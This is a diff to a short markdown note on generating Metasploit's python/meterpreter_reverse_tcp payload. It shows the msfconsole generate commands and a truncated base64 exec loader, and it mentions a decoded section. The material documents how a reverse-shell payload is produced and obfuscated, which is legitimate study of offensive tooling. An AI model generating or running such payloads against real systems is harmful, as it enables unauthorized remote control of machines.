@@ -1,21 +1,19 @@
-# Metasploit python meterpreter_reverse_tcp
+# python/meterpreter_reverse_tcp (single payload)
 
-## Single payload
-
-### Generate
+## Generate
 
 ```
-msf5 > use payload/python/meterpreter_reverse_tcp
+msf5 > use python/meterpreter_reverse_tcp
 msf5 payload(python/meterpreter_bind_tcp) > generate -f raw -o single.py
 ```
-### Result
+## Result
 ```python
 import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('IyEvdXNyL2Jpbi9weXRob24KaW1wb3J0IGJpbmFzY2lpCmltcG9yd...
 ...)))
 ```
 
-### Base64 Decoded Content
-The meterpreter payload is invocated as follows (see end of file):
+## Base64 Decoded Content
+The meterpreter payload is invoked as follows (see end of file):
 ```python
 ...
 _try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
